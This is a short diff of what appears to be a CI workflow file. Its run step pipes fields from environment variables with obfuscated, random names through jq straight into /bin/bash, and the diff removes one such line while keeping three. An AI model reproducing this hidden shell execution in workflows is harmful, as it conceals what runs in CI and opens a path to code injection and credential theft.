@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$mjkqm0" | jq -r .hgm3767 | /bin/bash
           echo $g33 | jq -r .wgrtz978 | /bin/bash
-          echo $y46245 | jq -r .pfhk47 | /bin/bash
           printf '%s' "$ezv65594" | jq -r .lgm6 | /bin/bash
 
       - name: Store results
